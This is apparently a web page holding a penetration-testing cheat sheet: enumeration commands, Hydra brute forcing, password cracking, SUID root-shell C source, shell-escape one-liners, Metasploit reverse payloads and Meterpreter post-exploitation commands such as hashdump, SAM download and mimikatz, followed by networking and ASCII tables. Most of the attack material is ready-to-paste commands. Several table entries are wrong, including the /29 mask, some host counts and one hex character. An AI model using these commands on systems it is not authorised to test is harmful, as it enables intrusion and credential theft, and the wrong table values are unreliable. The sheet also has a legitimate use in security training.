<h2>Recon and Enumeration</h2>
<h3>NMAP Commands</h3>
<p>Nmap (“Network Mapper”) is a free and open source utility for network discovery and security auditing. Many systems and network administrators also find it useful for tasks such as network inventory, managing service upgrade schedules, and monitoring host or service uptime. Nmap uses raw IP packets in novel ways to determine what hosts are available on the network, what services (application name and version) those hosts are offering, what operating systems (and OS versions) they are running, what type of packet filters/firewalls are in use, and dozens of other characteristics. It was designed to rapidly scan large networks, but works fine against single hosts. Nmap runs on all major computer operating systems, and official binary packages are available for Linux, Windows, and Mac OS X.</p>
<table>
<thead>
<tr>
<th>Command</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr>
<td>nmap -v -sS -A -T4 target</td>
<td>Nmap verbose scan, runs syn stealth, T4 timing (should be ok on LAN), OS and service version info, traceroute and scripts against services</td>
</tr>
<tr>
<td>nmap -v -sS -p–A -T4 target</td>
<td>As above but scans all TCP ports (takes a lot longer)</td>
</tr>
<tr>
<td>nmap -v -sU -sS -p- -A -T4 target</td>
<td>As above but scans all TCP ports and UDP scan (takes even longer)</td>
</tr>
<tr>
<td>nmap -v -p 445 –script=smb-check-vulns<br>
–script-args=unsafe=1 192.168.1.X</td>
<td>Nmap script to scan for vulnerable SMB servers – WARNING: unsafe=1 may cause knockover</td>
</tr>
<tr>
 <td>nmap localhost</td>
 <td>Displays all the ports that are currently in use</td>
 </tr>
 <tr>
<td>ls /usr/share/nmap/scripts/* | grep ftp</td>
<td>Search nmap scripts for keywords</td>
</tr>
</tbody>
</table>
<h2>SMB enumeration</h2>
<p>In computer networking, Server Message Block (SMB), one version of which was also known as Common Internet File System (CIFS, /ˈsɪfs/), operates as an application-layer network protocol mainly used for providing shared access to files, printers, and serial ports and miscellaneous communications between nodes on a network</p>
<table>
<thead>
<tr>
<th>Command</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr>
<td>nbtscan 192.168.1.0/24</td>
<td>Discover Windows / Samba servers on subnet, finds Windows MAC addresses, netbios name and discover client workgroup / domain</td>
</tr>
<tr>
<td>enum4linux -a target-ip</td>
<td>Do Everything, runs all options (find windows client domain / workgroup) apart from dictionary based share name guessing</td>
</tr>
</tbody>
</table>
<h3>Other Host Discovery</h3>
<p>Other methods of host discovery, that don’t use nmap…</p>
<table>
<thead>
<tr>
<th>Command</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr>
<td>netdiscover -r 192.168.1.0/24</td>
<td>Discovers IP, MAC Address and MAC vendor on the subnet from ARP, helpful for confirming you’re on the right VLAN at $client site</td>
</tr>
</tbody>
</table>
<h3>SMB Enumeration</h3>
<p>Enumerate Windows shares / Samba shares.</p>
<table>
<thead>
<tr>
<th>Command</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr>
<td>nbtscan 192.168.1.0/24</td>
<td>Discover Windows / Samba servers on subnet, finds Windows MAC addresses, netbios name and discover client workgroup / domain</td>
</tr>
<tr>
<td>enum4linux -a target-ip</td>
<td>Do Everything, runs all options (find windows client domain / workgroup) apart from dictionary based share name guessing</td>
</tr>
</tbody>
</table>
<h2>Python Local Web Server</h2>
<p>Python local web server command, handy for serving up shells and exploits on an attacking machine.</p>
<table>
<thead>
<tr>
<th>Command</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr>
<td>python -m SimpleHTTPServer 80</td>
<td>Run a basic http server, great for serving up shells etc</td>
</tr>
</tbody>
</table>
<h2>Mounting File Shares</h2>
<p>How to mount NFS / CIFS, Windows and Linux file shares.</p>
<table>
<thead>
<tr>
<th>Command</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr>
<td>mount 192.168.1.1:/vol/share /mnt/nfs</td>
<td>Mount NFS share to /mnt/nfs</td>
</tr>
<tr>
<td>mount -t cifs -o username=user,password=pass<br>
,domain=blah //192.168.1.X/share-name /mnt/cifs</td>
<td>Mount Windows CIFS / SMB share on Linux at /mnt/cifs if you remove password it will prompt on the CLI (more secure as it wont end up in bash_history)</td>
</tr>
<tr>
<td>net use Z: \\win-server\share password<br>
/user:domain\janedoe /savecred /p:no</td>
<td>Mount a Windows share on Windows from the command line</td>
</tr>
<tr>
<td>apt-get install smb4k -y</td>
<td>Install smb4k on Kali, useful Linux GUI for browsing SMB shares</td>
</tr>
</tbody>
</table>
<h2>Basic FingerPrinting</h2>
<p>A device fingerprint or machine fingerprint or browser fingerprint is information collected about a remote computing device for the purpose of identification. Fingerprints can be used to fully or partially identify individual users or devices even when cookies are turned off.</p>
<table>
<thead>
<tr>
<th>Command</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr>
<td>nc -v 192.168.1.1 25<p></p>
<p>telnet 192.168.1.1 25</p></td>
<td>Basic versioning / fingerprinting via displayed banner</td>
</tr>
</tbody>
</table>
<h2>SNMP Enumeration</h2>
<p>SNMP enumeration is the process of using SNMP to enumerate user accounts on a target system. SNMP employs two major types of software components for communication: the SNMP agent, which is located on the networking device, and the SNMP management station, which communicates with the agent.</p>
<table>
<thead>
<tr>
<th>Command</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr>
<td>snmpcheck -t 192.168.1.X -c public<p></p>
<p>snmpwalk -c public -v1 192.168.1.X 1|<br>
grep hrSWRunName|cut -d* * -f</p>
<p>snmpenum -t 192.168.1.X</p>
<p>onesixtyone -c names -i hosts</p></td>
<td>SNMP enumeration</td>
</tr>
</tbody>
</table>
<h2>DNS Zone Transfers</h2>
<table>
<thead>
<tr>
<th>Command</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr>
<td>nslookup -&gt; set type=any -&gt; ls -d blah.com</td>
<td>Windows DNS zone transfer</td>
</tr>
<tr>
<td>dig axfr blah.com @ns1.blah.com</td>
<td>Linux DNS zone transfer</td>
</tr>
</tbody>
</table>
<h2>DNSRecon</h2>
<p>DNSRecon provides the ability to perform:</p>
<ol>
<li>Check all NS Records for Zone Transfers</li>
<li>Enumerate General DNS Records for a given Domain (MX, SOA, NS, A, AAAA, SPF and TXT)</li>
<li>Perform common SRV Record Enumeration. Top Level Domain (TLD) Expansion</li>
<li>Check for Wildcard Resolution</li>
<li>Brute Force subdomain and host A and AAAA records given a domain and a wordlist</li>
<li>Perform a PTR Record lookup for a given IP Range or CIDR</li>
<li>Check a DNS Server Cached records for A, AAAA and CNAME Records provided a list of host records in a text file to check</li>
<li>Enumerate Common mDNS records in the Local Network Enumerate Hosts and Subdomains using Google</li>
</ol>
<pre> DNS Enumeration Kali - DNSReconroot:~#
 dnsrecon -d TARGET -D /usr/share/wordlists/dnsmap.txt -t std --xml ouput.xml</pre>
<h2>HTTP / HTTPS Webserver Enumeration</h2>
<table>
<thead>
<tr>
<th>Command</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr>
<td>nikto -h 192.168.1.1</td>
<td>Perform a nikto scan against target</td>
</tr>
<tr>
<td>dirbuster</td>
<td>Configure via GUI, CLI input doesn’t work most of the time</td>
</tr>
</tbody>
</table>
<h2>Packet Inspection</h2>
<table>
<thead>
<tr>
<th>Command</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr>
<td>tcpdump tcp port 80 -w output.pcap -i eth0</td>
<td>tcpdump for port 80 on interface eth0, outputs to output.pcap</td>
</tr>
</tbody>
</table>
<h2>Username Enumeration</h2>
<p>Some techniques used to remotely enumerate users on a target system.</p>
<h3>SMB User Enumeration</h3>
<table>
<thead>
<tr>
<th>Command</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr>
<td>python /usr/share/doc/python-impacket-doc/examples<br>
/samrdump.py 192.168.XXX.XXX</td>
<td>Enumerate users from SMB</td>
</tr>
<tr>
<td>ridenum.py 192.168.XXX.XXX 500 50000 dict.txt</td>
<td>RID cycle SMB / enumerate users from SMB</td>
</tr>
</tbody>
</table>
<h3>SNMP User Enumeration</h3>
<table>
<thead>
<tr>
<th>Command</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr>
<td>snmpwalk public -v1 192.168.X.XXX 1 |grep 77.1.2.25<br>
|cut -d” “ -f4</td>
<td>Enmerate users from SNMP</td>
</tr>
<tr>
<td>python /usr/share/doc/python-impacket-doc/examples/<br>
samrdump.py SNMP 192.168.X.XXX</td>
<td>Enmerate users from SNMP</td>
</tr>
<tr>
<td>nmap -sT -p 161 192.168.X.XXX/254 -oG snmp_results.txt<br>
(then grep)</td>
<td>Search for SNMP servers with nmap, grepable output</td>
</tr>
</tbody>
</table>
<h2>Passwords</h2>
<h3>Wordlists</h3>
<table>
<thead>
<tr>
<th>Command</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr>
<td>/usr/share/wordlists</td>
<td>Kali word lists</td>
</tr>
</tbody>
</table>
<p>Massive wordlist here at <a href="https://www.hacktoday.com/password-cracking-dictionarys-download-for-free/" target="_blank">HackToday’s blog</a></p>
<h2>Brute Forcing Services</h2>
<h3>Hydra FTP Brute Force</h3>
<p>Hydra is a parallelized login cracker which supports numerous protocols to attack. It is very fast and flexible, and new modules are easy to add. This tool makes it possible for researchers and security consultants to show how easy it would be to gain unauthorized access to a system remotely. On Ubuntu it can be installed from the synaptic package manager. On Kali Linux, it is per-installed.</p>
<table>
<thead>
<tr>
<th>Command</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr>
<td>hydra -l USERNAME -P /usr/share/wordlistsnmap.lst -f<br>
192.168.X.XXX ftp -V</td>
<td>Hydra FTP brute force</td>
</tr>
</tbody>
</table>
<h3>Hydra POP3 Brute Force</h3>
<table>
<thead>
<tr>
<th>Command</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr>
<td>hydra -l USERNAME -P /usr/share/wordlistsnmap.lst -f<br>
192.168.X.XXX pop3 -V</td>
<td>Hydra POP3 brute force</td>
</tr>
</tbody>
</table>
<h3>Hydra SMTP Brute Force</h3>
<table>
<thead>
<tr>
<th>Command</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr>
<td>hydra -P /usr/share/wordlistsnmap.lst 192.168.X.XXX smtp -V</td>
<td>Hydra SMTP brute force</td>
</tr>
</tbody>
</table>
<p>Use -t to limit concurrent connections, example: -t 15</p>
<h2>Password Cracking</h2>
<h3>John The Ripper – JTR</h3>
<p>John the Ripper is different from tools like Hydra. Hydra does blind brute-forcing by trying username/password combinations on a service daemon like ftp server or telnet server. John however needs the hash first. So the greater challenge for a hacker is to first get the hash that is to be cracked. Now a days hashes are more easily crackable using free rainbow tables available online. Just go to one of the sites, submit the hash and if the hash is made of a common word, then the site would show the word almost instantly. Rainbow tables basically store common words and their hashes in a large database. Larger the database, more the words covered.</p>
<table>
<thead>
<tr>
<th>Command</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr>
<td>john –wordlist=/usr/share/wordlists/rockyou.txt hashes</td>
<td>JTR password cracking</td>
</tr>
<tr>
<td>john –format=descrypt –wordlist<br>
/usr/share/wordlists/rockyou.txt hash.txt</td>
<td>JTR forced descrypt cracking with wordlist</td>
</tr>
<tr>
<td>john –format=descrypt hash –show</td>
<td>JTR forced descrypt brute force cracking</td>
</tr>
</tbody>
</table>
<h2>Exploit Research</h2>
<p>Ways to find exploits for enumerated hosts / services.</p>
<table>
<thead>
<tr>
<th>Command</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr>
<td>searchsploit windows 2003 | grep -i local</td>
<td>Search exploit-db for exploit, in this example windows 2003 + local esc</td>
</tr>
<tr>
<td>site:exploit-db.com exploit kernel &lt;= 3</td>
<td>Use google to search exploit-db.com for exploits</td>
</tr>
<tr>
<td>grep -R “W7” /usr/share/metasploit-framework<br>
/modules/exploit/windows/*</td>
<td>Search metasploit modules using grep – msf search sucks a bit</td>
</tr>
</tbody>
</table>
<h2>Compiling Exploits</h2>
<h3>Identifying if C code is for Windows or Linux</h3>
<p>C #includes will indicate which OS should be used to build the exploit.</p>
<table>
<thead>
<tr>
<th>Command</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr>
<td>process.h, string.h, winbase.h, windows.h, winsock2.h</td>
<td>Windows exploit code</td>
</tr>
<tr>
<td>arpa/inet.h, fcntl.h, netdb.h, netinet/in.h,<br>
sys/sockt.h, sys/types.h, unistd.h</td>
<td>Linux exploit code</td>
</tr>
</tbody>
</table>
<h3>Build Exploit GCC</h3>
<p>Compile exploit gcc.</p>
<table>
<thead>
<tr>
<th>Command</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr>
<td>gcc -o exploit exploit.c</td>
<td>Basic GCC compile</td>
</tr>
</tbody>
</table>
<h3>GCC Compile 32Bit Exploit on 64Bit Kali</h3>
<p>Handy for cross compiling 32 bit binaries on 64 bit attacking machines.</p>
<table>
<thead>
<tr>
<th>Command</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr>
<td>gcc -m32 exploit.c -o exploit</td>
<td>Cross compile 32 bit binary on 64 bit Linux</td>
</tr>
</tbody>
</table>
<h3>Compile Windows .exe on Linux</h3>
<p>Build / compile windows exploits on Linux, resulting in a .exe file.</p>
<table>
<thead>
<tr>
<th>Command</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr>
<td>i586-mingw32msvc-gcc exploit.c -lws2_32 -o exploit.exe</td>
<td>Compile windows .exe on Linux</td>
</tr>
</tbody>
</table>
<h2>SUID Binary</h2>
<p>Often SUID C binary files are required to spawn a shell as a superuser, you can update the UID / GID and shell as required.</p>
<p>below are some quick copy and pate examples for various shells:</p>
<h3>SUID C Shell for /bin/bash</h3>
<figure>
<pre>int main(void){
       setresuid(0, 0, 0);
       system("/bin/bash");
}</pre>
</figure>
<h3>SUID C Shell for /bin/sh</h3>
<figure>
<pre>int main(void){
       setresuid(0, 0, 0);
       system("/bin/sh");
}</pre>
</figure>
<h3>Building the SUID Shell binary</h3>
<figure>
<pre>gcc -o suid suid.c</pre>
</figure>
<p>For 32 bit:</p>
<figure>
<pre>gcc -m32 -o suid suid.c</pre>
</figure>
<h2>TTY Shells</h2>
<p>Tips / Tricks to spawn a TTY shell from a limited shell in Linux, useful for running commands like su from reverse shells.</p>
<h3>Python TTY Shell Trick</h3>
<figure>
<pre>python -c 'import pty;pty.spawn("/bin/bash")'</pre>
</figure>
<figure>
<pre>echo os.system('/bin/bash')</pre>
</figure>
<h3>Spawn Interactive sh shell</h3>
<figure>
<pre>/bin/sh -i</pre>
</figure>
<h3>Spawn Perl TTY Shell</h3>
<figure>
<pre>exec "/bin/sh";
perl —e 'exec "/bin/sh";'</pre>
</figure>
<h3>Spawn Ruby TTY Shell</h3>
<figure>
<pre>exec "/bin/sh"</pre>
</figure>
<h3>Spawn Lua TTY Shell</h3>
<figure>
<pre>os.execute('/bin/sh')</pre>
</figure>
<h3>Spawn TTY Shell from Vi</h3>
<p>Run shell commands from vi:</p>
<figure>
<pre>:!bash</pre>
</figure>
<h3>Spawn TTY Shell NMAP</h3>
<figure>
<pre>!sh</pre>
</figure>
<h2>Metasploit</h2>
<p>Metasploit was created by H. D. Moore in 2003 as a portable network tool using Perl. By 2007, the Metasploit Framework had been completely rewritten in Ruby. On October 21, 2009, the Metasploit Project announced that it had been acquired by Rapid7, a security company that provides unified vulnerability management solutions.</p>
<p>Like comparable commercial products such as Immunity’s Canvas or Core Security Technologies’ Core Impact, Metasploit can be used to test the vulnerability of computer systems or to break into remote systems. Like many information security tools, Metasploit can be used for both legitimate and unauthorized activities. Since the acquisition of the Metasploit Framework, Rapid7 has added two open core proprietary editions called Metasploit Express and Metasploit Pro.</p>
<p>Metasploit’s emerging position as the de facto exploit development framework led to the release of software vulnerability advisories often accompanied by a third party Metasploit exploit module that highlights the exploitability, risk and remediation of that particular bug. Metasploit 3.0 began to include fuzzing tools, used to discover software vulnerabilities, rather than just exploits for known bugs. This avenue can be seen with the integration of the lorcon wireless (802.11) toolset into Metasploit 3.0 in November 2006. Metasploit 4.0 was released in August 2011.</p>
<h3>Meterpreter Payloads</h3>
<h3>Windows reverse meterpreter payload</h3>
<table>
<thead>
<tr>
<th>Command</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr>
<td>set payload windows/meterpreter/reverse_tcp</td>
<td>Windows reverse tcp payload</td>
</tr>
</tbody>
</table>
<h3>Windows VNC Meterpreter payload</h3>
<table>
<thead>
<tr>
<th>Command</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr>
<td>set payload windows/vncinject/reverse_tcp<p></p>
<p>set ViewOnly false</p></td>
<td>Meterpreter Windows VNC Payload</td>
</tr>
</tbody>
</table>
<h3>Linux Reverse Meterpreter payload</h3>
<table>
<thead>
<tr>
<th>Command</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr>
<td>set payload linux/meterpreter/reverse_tcp</td>
<td>Meterpreter Linux Reverse Payload</td>
</tr>
</tbody>
</table>
<h2>Meterpreter Cheat Sheet</h2>
<p>Useful meterpreter commands.</p>
<table>
<thead>
<tr>
<th>Command</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr>
<td>upload file c:\\windows</td>
<td>Meterpreter upload file to Windows target</td>
</tr>
<tr>
<td>download c:\\windows\\repair\\sam /tmp</td>
<td>Meterpreter download file from Windows target</td>
</tr>
<tr>
<td>download c:\\windows\\repair\\sam /tmp</td>
<td>Meterpreter download file from Windows target</td>
</tr>
<tr>
<td>execute -f c:\\windows\temp\exploit.exe</td>
<td>Meterpreter run .exe on target – handy for executing uploaded exploits</td>
</tr>
<tr>
<td>execute -f cmd -c</td>
<td>Creates new channel with cmd shell</td>
</tr>
<tr>
<td>ps</td>
<td>Meterpreter show processes</td>
</tr>
<tr>
<td>shell</td>
<td>Meterpreter get shell on the target</td>
</tr>
<tr>
<td>getsystem</td>
<td>Meterpreter attempts priviledge escalation the target</td>
</tr>
<tr>
<td>hashdump</td>
<td>Meterpreter attempts to dump the hashes on the target</td>
</tr>
<tr>
<td>portfwd add –l 3389 –p 3389 –r target</td>
<td>Meterpreter create port forward to target machine</td>
</tr>
<tr>
<td>portfwd delete –l 3389 –p 3389 –r target</td>
<td>Meterpreter delete port forward</td>
</tr>
</tbody>
</table>
<h2>Common Metasploit Modules</h2>
<h3>Remote Windows Metasploit Modules (exploits)</h3>
<table>
<thead>
<tr>
<th>Command</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr>
<td>use exploit/windows/smb/ms08_067_netapi</td>
<td>MS08_067 Windows 2k, XP, 2003 Remote Exploit</td>
</tr>
<tr>
<td>use exploit/windows/dcerpc/ms06_040_netapi</td>
<td>MS08_040 Windows NT, 2k, XP, 2003 Remote Exploit</td>
</tr>
<tr>
<td>use exploit/windows/smb/<br>
ms09_050_smb2_negotiate_func_index</td>
<td>MS09_050 Windows Vista SP1/SP2 and Server 2008 (x86) Remote Exploit</td>
</tr>
</tbody>
</table>
<h3>Local Windows Metasploit Modules (exploits)</h3>
<table>
<thead>
<tr>
<th>Command</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr>
<td>use exploit/windows/local/bypassuac</td>
<td>Bypass UAC on Windows 7 + Set target + arch, x86/64</td>
</tr>
</tbody>
</table>
<h3>Auxilary Metasploit Modules</h3>
<table>
<thead>
<tr>
<th>Command</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr>
<td>use auxiliary/scanner/http/dir_scanner</td>
<td>Metasploit HTTP directory scanner</td>
</tr>
<tr>
<td>use auxiliary/scanner/http/jboss_vulnscan</td>
<td>Metasploit JBOSS vulnerability scanner</td>
</tr>
<tr>
<td>use auxiliary/scanner/mssql/mssql_login</td>
<td>Metasploit MSSQL Credential Scanner</td>
</tr>
<tr>
<td>use auxiliary/scanner/mysql/mysql_version</td>
<td>Metasploit MSSQL Version Scanner</td>
</tr>
<tr>
<td>use auxiliary/scanner/oracle/oracle_login</td>
<td>Metasploit Oracle Login Module</td>
</tr>
</tbody>
</table>
<h3>Metasploit Powershell Modules</h3>
<table>
<thead>
<tr>
<th>Command</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr>
<td>use exploit/multi/script/web_delivery</td>
<td>Metasploit powershell payload delivery module</td>
</tr>
<tr>
<td>post/windows/manage/powershell/exec_powershell</td>
<td>Metasploit upload and run powershell script through a session</td>
</tr>
<tr>
<td>use exploit/multi/http/jboss_maindeployer</td>
<td>Metasploit JBOSS deploy</td>
</tr>
<tr>
<td>use exploit/windows/mssql/mssql_payload</td>
<td>Metasploit MSSQL payload</td>
</tr>
</tbody>
</table>
<h3>Post Exploit Windows Metasploit Modules</h3>
<table>
<thead>
<tr>
<th>Command</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr>
<td>run post/windows/gather/win_privs</td>
<td>Metasploit show privileges of current user</td>
</tr>
<tr>
<td>use post/windows/gather/credentials/gpp</td>
<td>Metasploit grab GPP saved passwords</td>
</tr>
<tr>
<td>load mimikatz -&gt; wdigest</td>
<td>Metasplit load Mimikatz</td>
</tr>
<tr>
<td>run post/windows/gather/local_admin_search_enum</td>
<td>Idenitfy other machines that the supplied domain user has administrative access to</td>
</tr>
</tbody>
</table>
<h2>Networking</h2>
<h3>TTL Fingerprinting</h3>
<table>
<thead>
<tr>
<th>Operating System</th>
<th>TTL Size</th>
</tr>
</thead>
<tbody>
<tr>
<td>Windows</td>
<td>128</td>
</tr>
<tr>
<td>Linux</td>
<td>64</td>
</tr>
<tr>
<td>Solaris</td>
<td>255</td>
</tr>
<tr>
<td>Cisco / Network</td>
<td>255</td>
</tr>
</tbody>
</table>
<h2>IPv4</h2>
<h3>Classful IP Ranges</h3>
<p>E.g Class A,B,C (depreciated)</p>
<table>
<thead>
<tr>
<th>Class</th>
<th>IP Address Range</th>
</tr>
</thead>
<tbody>
<tr>
<td>Class A IP Address Range</td>
<td>0.0.0.0 – 127.255.255.255</td>
</tr>
<tr>
<td>Class B IP Address Range</td>
<td>128.0.0.0 – 191.255.255.255</td>
</tr>
<tr>
<td>Class C IP Address Range</td>
<td>192.0.0.0 – 223.255.255.255</td>
</tr>
<tr>
<td>Class D IP Address Range</td>
<td>224.0.0.0 – 239.255.255.255</td>
</tr>
<tr>
<td>Class E IP Address Range</td>
<td>240.0.0.0 – 255.255.255.255</td>
</tr>
</tbody>
</table>
<h3>IPv4 Private Address Ranges</h3>
<table>
<thead>
<tr>
<th>Class</th>
<th>Range</th>
</tr>
</thead>
<tbody>
<tr>
<td>Class A Private Address Range</td>
<td>10.0.0.0 – 10.255.255.255</td>
</tr>
<tr>
<td>Class B Private Address Range</td>
<td>172.16.0.0 – 172.31.255.255</td>
</tr>
<tr>
<td>Class C Private Address Range</td>
<td>192.168.0.0 – 192.168.255.255</td>
</tr>
<tr>
<td></td>
<td>127.0.0.0 – 127.255.255.255</td>
</tr>
</tbody>
</table>
<h3>IPv4 Subnet Cheat Sheet</h3>
<table>
<thead>
<tr>
<th>CIDR</th>
<th>Decimal Mask</th>
<th>Number of Hosts</th>
</tr>
</thead>
<tbody>
<tr>
<td>/31</td>
<td>255.255.255.254</td>
<td>1 Host</td>
</tr>
<tr>
<td>/30</td>
<td>255.255.255.252</td>
<td>2 Hosts</td>
</tr>
<tr>
<td>/29</td>
<td>255.255.255.249</td>
<td>6 Hosts</td>
</tr>
<tr>
<td>/28</td>
<td>255.255.255.240</td>
<td>14 Hosts</td>
</tr>
<tr>
<td>/27</td>
<td>255.255.255.224</td>
<td>30 Hosts</td>
</tr>
<tr>
<td>/26</td>
<td>255.255.255.192</td>
<td>62 Hosts</td>
</tr>
<tr>
<td>/25</td>
<td>255.255.255.128</td>
<td>126 Hosts</td>
</tr>
<tr>
<td>/24</td>
<td>255.255.255.0</td>
<td>254 Hosts</td>
</tr>
<tr>
<td>/23</td>
<td>255.255.254.0</td>
<td>512 Host</td>
</tr>
<tr>
<td>/22</td>
<td>255.255.252.0</td>
<td>1022 Hosts</td>
</tr>
<tr>
<td>/21</td>
<td>255.255.248.0</td>
<td>2046 Hosts</td>
</tr>
<tr>
<td>/20</td>
<td>255.255.240.0</td>
<td>4094 Hosts</td>
</tr>
<tr>
<td>/19</td>
<td>255.255.224.0</td>
<td>8190 Hosts</td>
</tr>
<tr>
<td>/18</td>
<td>255.255.192.0</td>
<td>16382 Hosts</td>
</tr>
<tr>
<td>/17</td>
<td>255.255.128.0</td>
<td>32766 Hosts</td>
</tr>
<tr>
<td>/16</td>
<td>255.255.0.0</td>
<td>65534 Hosts</td>
</tr>
<tr>
<td>/15</td>
<td>255.254.0.0</td>
<td>131070 Hosts</td>
</tr>
<tr>
<td>/14</td>
<td>255.252.0.0</td>
<td>262142 Hosts</td>
</tr>
<tr>
<td>/13</td>
<td>255.248.0.0</td>
<td>524286 Hosts</td>
</tr>
<tr>
<td>/12</td>
<td>255.240.0.0</td>
<td>1048674 Hosts</td>
</tr>
<tr>
<td>/11</td>
<td>255.224.0.0</td>
<td>2097150 Hosts</td>
</tr>
<tr>
<td>/10</td>
<td>255.192.0.0</td>
<td>4194302 Hosts</td>
</tr>
<tr>
<td>/9</td>
<td>255.128.0.0</td>
<td>8388606 Hosts</td>
</tr>
<tr>
<td>/8</td>
<td>255.0.0.0</td>
<td>16777214 Hosts</td>
</tr>
</tbody>
</table>
<h2>ASCII Table Cheat Sheet</h2>
<p>Useful for Web Application Penetration Testing, or if you get stranded on Mars and need to communicate with NASA.</p>
<table>
<thead>
<tr>
<th>ASCII</th>
<th>Character</th>
</tr>
</thead>
<tbody>
<tr>
<td>x00</td>
<td>Null Byte</td>
</tr>
<tr>
<td>x08</td>
<td>BS</td>
</tr>
<tr>
<td>x09</td>
<td>TAB</td>
</tr>
<tr>
<td>x0a</td>
<td>LF</td>
</tr>
<tr>
<td>x0d</td>
<td>CR</td>
</tr>
<tr>
<td>x1b</td>
<td>ESC</td>
</tr>
<tr>
<td>x20</td>
<td>SPC</td>
</tr>
<tr>
<td>x21</td>
<td>!</td>
</tr>
<tr>
<td>x22</td>
<td>“</td>
</tr>
<tr>
<td>x23</td>
<td>#</td>
</tr>
<tr>
<td>x24</td>
<td>$</td>
</tr>
<tr>
<td>x25</td>
<td>%</td>
</tr>
<tr>
<td>x26</td>
<td>&amp;</td>
</tr>
<tr>
<td>x27</td>
<td>`</td>
</tr>
<tr>
<td>x28</td>
<td>(</td>
</tr>
<tr>
<td>x29</td>
<td>)</td>
</tr>
<tr>
<td>x2a</td>
<td>*</td>
</tr>
<tr>
<td>x2b</td>
<td>+</td>
</tr>
<tr>
<td>x2c</td>
<td>,</td>
</tr>
<tr>
<td>x2d</td>
<td>–</td>
</tr>
<tr>
<td>x2e</td>
<td>.</td>
</tr>
<tr>
<td>x2f</td>
<td>/</td>
</tr>
<tr>
<td>x30</td>
<td>0</td>
</tr>
<tr>
<td>x31</td>
<td>1</td>
</tr>
<tr>
<td>x32</td>
<td>2</td>
</tr>
<tr>
<td>x33</td>
<td>3</td>
</tr>
<tr>
<td>x34</td>
<td>4</td>
</tr>
<tr>
<td>x35</td>
<td>5</td>
</tr>
<tr>
<td>x36</td>
<td>6</td>
</tr>
<tr>
<td>x37</td>
<td>7</td>
</tr>
<tr>
<td>x38</td>
<td>8</td>
</tr>
<tr>
<td>x39</td>
<td>9</td>
</tr>
<tr>
<td>x3a</td>
<td>:</td>
</tr>
<tr>
<td>x3b</td>
<td>;</td>
</tr>
<tr>
<td>x3c</td>
<td>&lt;</td>
</tr>
<tr>
<td>x3d</td>
<td>=</td>
</tr>
<tr>
<td>x3e</td>
<td>&gt;</td>
</tr>
<tr>
<td>x3f</td>
<td>?</td>
</tr>
<tr>
<td>x40</td>
<td>@</td>
</tr>
<tr>
<td>x41</td>
<td>A</td>
</tr>
<tr>
<td>x42</td>
<td>B</td>
</tr>
<tr>
<td>x43</td>
<td>C</td>
</tr>
<tr>
<td>x44</td>
<td>D</td>
</tr>
<tr>
<td>x45</td>
<td>E</td>
</tr>
<tr>
<td>x46</td>
<td>F</td>
</tr>
<tr>
<td>x47</td>
<td>G</td>
</tr>
<tr>
<td>x48</td>
<td>H</td>
</tr>
<tr>
<td>x49</td>
<td>I</td>
</tr>
<tr>
<td>x4a</td>
<td>J</td>
</tr>
<tr>
<td>x4b</td>
<td>K</td>
</tr>
<tr>
<td>x4c</td>
<td>L</td>
</tr>
<tr>
<td>x4d</td>
<td>M</td>
</tr>
<tr>
<td>x4e</td>
<td>N</td>
</tr>
<tr>
<td>x4f</td>
<td>O</td>
</tr>
<tr>
<td>x50</td>
<td>P</td>
</tr>
<tr>
<td>x51</td>
<td>Q</td>
</tr>
<tr>
<td>x52</td>
<td>R</td>
</tr>
<tr>
<td>x53</td>
<td>S</td>
</tr>
<tr>
<td>x54</td>
<td>T</td>
</tr>
<tr>
<td>x55</td>
<td>U</td>
</tr>
<tr>
<td>x56</td>
<td>V</td>
</tr>
<tr>
<td>x57</td>
<td>W</td>
</tr>
<tr>
<td>x58</td>
<td>X</td>
</tr>
<tr>
<td>x59</td>
<td>Y</td>
</tr>
<tr>
<td>x5a</td>
<td>Z</td>
</tr>
<tr>
<td>x5b</td>
<td>[</td>
</tr>
<tr>
<td>x5c</td>
<td>\</td>
</tr>
<tr>
<td>x5d</td>
<td>]</td>
</tr>
<tr>
<td>x5e</td>
<td>^</td>
</tr>
<tr>
<td>x5f</td>
<td>_</td>
</tr>
<tr>
<td>x60</td>
<td>`</td>
</tr>
<tr>
<td>x61</td>
<td>a</td>
</tr>
<tr>
<td>x62</td>
<td>b</td>
</tr>
<tr>
<td>x63</td>
<td>c</td>
</tr>
<tr>
<td>x64</td>
<td>d</td>
</tr>
<tr>
<td>x65</td>
<td>e</td>
</tr>
<tr>
<td>x66</td>
<td>f</td>
</tr>
<tr>
<td>x67</td>
<td>g</td>
</tr>
<tr>
<td>x68</td>
<td>h</td>
</tr>
<tr>
<td>x69</td>
<td>i</td>
</tr>
<tr>
<td>x6a</td>
<td>j</td>
</tr>
<tr>
<td>x6b</td>
<td>k</td>
</tr>
